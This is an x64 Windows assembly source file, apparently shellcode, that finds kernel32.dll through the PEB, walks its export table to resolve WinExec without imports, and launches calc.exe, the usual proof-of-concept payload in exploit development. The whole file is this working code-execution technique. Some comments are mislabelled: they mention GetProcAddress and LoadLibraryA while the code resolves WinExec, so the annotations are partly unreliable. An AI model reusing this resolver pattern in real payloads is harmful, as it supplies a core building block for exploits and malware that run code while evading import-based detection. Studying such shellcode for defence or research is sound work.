;nasm -fwin64 [x64findkernel32.asm]
;ld -m i386pep -o x64findkernel32.exe x64findkernel32.obj

BITS 64
SECTION .text
global main
main:

sub rsp, 0x28
and rsp, 0xFFFFFFFFFFFFFFF0
xor rcx, rcx             ; RCX = 0
mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr
mov rsi,[rax+0x10] ;PEB.Ldr->InMemOrderModuleList
mov rsi, [rsi]
mov rsi,[rsi]
mov rbx, [rsi+0x30] ;kernel32.dll base address
mov r8, rbx         ; mov kernel32.dll base addr into r8

;Code for parsing Export Address Table
mov ebx, [rbx+0x3C]           ; Get Kernel32 PE Signature (offset 0x3C) into EBX
add rbx, r8                   ; Add signature offset to kernel32 base. Store in RBX.
mov edx, [rbx+0x88]           ; Offset from PE32 Signature to Export Address Table
add rdx, r8                   ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
mov r10d, [rdx+0x14]          ; Number of functions
xor r11, r11                  ; Zero R11 before use
mov r11d, [rdx+0x20]          ; AddressOfNames RVA
add r11, r8                   ; AddressOfNames VMA

mov rcx, r10                      ; Set loop counter

mov rax, 0x00636578456E6957   ; WinExec 
push rax
mov rax, rsp	
add rsp, 8
jmp kernel32findfunction

; Loop over Export Address Table to find WinApi names
kernel32findfunction: 
    jecxz FunctionNameNotFound    ; Loop around this function until we find WinExec
    xor ebx,ebx                   ; Zero EBX for use
    mov ebx, [r11+4+rcx*4]        ; EBX = RVA for first AddressOfName
    add rbx, r8                   ; RBX = Function name VMA / add kernel32 base address to RVA and get WinApi name
    dec rcx                       ; Decrement our loop by one, this goes from Z to A
   
    mov r9, qword [rax]                ; R9 = "WinExec"
    cmp [rbx], r9                      ; Compare all bytes
    jz FunctionNameFound               ; If match, function found
	jnz kernel32findfunction

FunctionNameFound:
push rcx
jmp OrdinalLookupSetup

FunctionNameNotFound:
int3

OrdinalLookupSetup:  ;We found our target WinApi position in the functions lookup
   pop r15         ;getprocaddress position
   js OrdinalLookup
   
OrdinalLookup:   
   mov rcx, r15
   xor r11, r11
   mov r11d, [rdx+0x24]          ; AddressOfNameOrdinals RVA
   add r11, r8                   ; AddressOfNameOrdinals VMA
   ; Get the function ordinal from AddressOfNameOrdinals
   inc rcx
   mov r13w, [r11+rcx*2]         ; AddressOfNameOrdinals + Counter. RCX = counter
   ;With the function ordinal value, we can finally lookup the WinExec address from AddressOfFunctions.

; Get function address from AddressOfFunctions
   xor r11, r11
   mov r11d, [rdx+0x1c]          ; AddressOfFunctions RVA
   add r11, r8                   ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
   mov eax, [r11+4+r13*4]        ; Get the function RVA.
   add rax, r8                   ; Found the GetProcAddress WinApi!!!
   push rax                      ;store function addresses by pushing them temporarily
   js executeit

executeit:
; --- prepare to call WinExec ---
pop r15                         ;address for WinExec
xor rax, rax
push rax
mov rax, 0x6578652E636C6163   ; calc.exe 
push rax
mov rcx, rsp	                 ; RDX points to "LoadLibraryA" (second argument)
mov rdx, 1
sub rsp, 0x30
call r15                         ; Call WinExec
